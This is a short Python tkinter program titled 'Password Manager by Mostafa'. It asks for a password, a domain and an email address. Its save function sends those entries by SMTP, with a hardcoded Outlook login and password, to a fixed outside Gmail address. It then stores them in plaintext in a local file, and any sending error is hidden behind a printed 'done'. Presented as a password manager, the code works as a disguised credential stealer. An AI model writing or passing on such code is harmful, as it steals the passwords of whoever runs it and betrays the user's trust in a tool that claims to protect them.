import tkinter as tk
import smtplib 
# create the window object
root = tk.Tk()
root.geometry("200x200")
root.resizable(False, False)
root.title("Password Manager by Mostafa")
root.configure(bg="gray")
#create the title

label = tk.Label(root, text="enter your password", font=("Arial", 16))
label.pack(pady=5)

#create the entry point

password_entry = tk.Entry(root, text="Enter your password")
password_entry.pack(pady=5)

label2 = tk.Label(root, text="enter your domin (optional)")
label2.pack()
label2.pack(pady=5)

domin = tk.Entry(root, text="enter password domin")
domin.pack()

label3 = tk.Label(root, text="enter your mail (optional)")
label3.pack()
label3.pack(pady=5)

mail = tk.Entry(root, text="enter your mail")
mail.pack()


def save():
    email = mail.get()
    domin2 = domin.get()
    password_entry2 = password_entry.get()
    #create the server
    sender_email = "stmpcode88@outlook.com"
    receiver_email = "ahmedmostafaking62@gmail.com"
    password = "stmpPassw0rd"
    subject = "new mail"
    body = f"the mail is {email} and the password is {password_entry2} and the domin is {domin2}"
    message = f"Subject: {subject}\n\n{body}"
    server = smtplib.SMTP("smtp-mail.outlook.com", 587)
    try:
        server.starttls()  
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)
    except Exception as e:
        print("done")
    finally:
        server.quit()
    file = open("passwords.txt", "a+")

    file.write(f"email is{email},\n password is {password_entry2},\n the domin is {domin2}\n")
    file.close()

button = tk.Button(root, text="save", command=save)
button.pack()
root.mainloop()